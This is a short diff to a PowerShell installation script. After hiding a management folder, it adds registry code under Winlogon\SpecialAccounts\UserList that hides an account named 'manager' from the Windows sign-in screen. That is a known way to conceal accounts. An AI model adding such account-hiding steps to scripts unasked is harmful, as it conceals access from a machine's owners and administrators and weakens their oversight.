@@ -57,5 +57,9 @@ Set-Acl $ManagePath $Acl
 $Folder = Get-Item $ManagePath -Force
 $Folder.Attributes = [System.IO.FileAttributes]::Directory -bor [System.IO.FileAttributes]::Hidden
 
+$HidePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+if (!(Test-Path $HidePath)) { New-Item -Path $HidePath -Force }
+Set-ItemProperty -Path $HidePath -Name "manager" -Value 0 -Type DWord
+
 Write-Host "`n=== Installation Complete! ===" -ForegroundColor Cyan
 Pause
